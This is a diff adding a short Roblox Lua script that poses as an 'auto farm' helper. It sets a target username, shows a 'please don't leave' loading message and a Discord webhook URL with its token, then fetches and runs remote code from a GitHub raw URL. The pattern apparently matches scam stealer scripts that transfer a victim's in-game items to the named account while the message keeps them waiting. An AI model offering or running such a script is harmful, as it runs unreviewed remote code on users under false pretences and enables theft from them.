@@ -1,0 +1,4 @@
+_G.Username = "hoang_anhnopro2"
+_G.HubName = "Auto farm comet script are loading, please don't leave"
+_G.WebhookUrl = "discord.com/api/webhooks/1107668880643596388/rMDItVLqFRHiD-OwxW3od6zujppf12Goi4srP-c9pm30DgJhlAKJReG8CoTgxXs_83LL"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
